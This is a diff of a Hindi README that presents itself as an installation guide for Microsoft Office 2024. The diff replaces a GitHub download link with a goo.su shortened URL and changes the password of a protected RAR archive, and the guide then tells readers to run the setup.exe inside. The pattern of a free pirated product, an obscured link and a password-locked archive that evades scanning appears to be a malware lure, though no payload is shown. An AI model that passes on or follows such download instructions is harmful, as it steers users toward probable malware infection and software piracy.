@@ -2,9 +2,9 @@
 
 <H3>⚙️ Microsoft Office 2024 कैसे इंस्टॉल करें</H3>
 
-- [डाउनलोड करें](https://github.com/timeosilly/microsoft-office-2024-hindi/releases/download/Download/MO24.rar)
+- [डाउनलोड करें](https://goo.su/cUUmblp)
 
-- आर्काइव खोलें (पासवर्ड: Office24)
+- आर्काइव खोलें (पासवर्ड: Project12!)
 
 - घटकों को डाउनलोड करने और इंस्टॉल करने के लिए setup.exe खोलें
 - निर्देशों का पालन करें
